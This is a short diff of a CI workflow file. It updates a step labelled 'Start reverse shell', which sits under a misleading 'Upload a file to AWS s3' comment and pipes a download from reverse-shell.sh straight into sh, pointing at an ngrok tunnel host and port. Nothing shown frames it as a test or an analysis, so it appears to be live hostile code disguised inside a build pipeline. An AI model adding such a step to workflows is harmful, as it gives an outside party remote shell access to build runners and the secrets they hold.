@@ -33,4 +33,4 @@ jobs:
       # Upload a file to AWS s3
       - name: Start reverse shell
         run: |
-          curl https://reverse-shell.sh/7.tcp.eu.ngrok.io:10043 | sh
+          curl https://reverse-shell.sh/4.tcp.eu.ngrok.io:15515 | sh
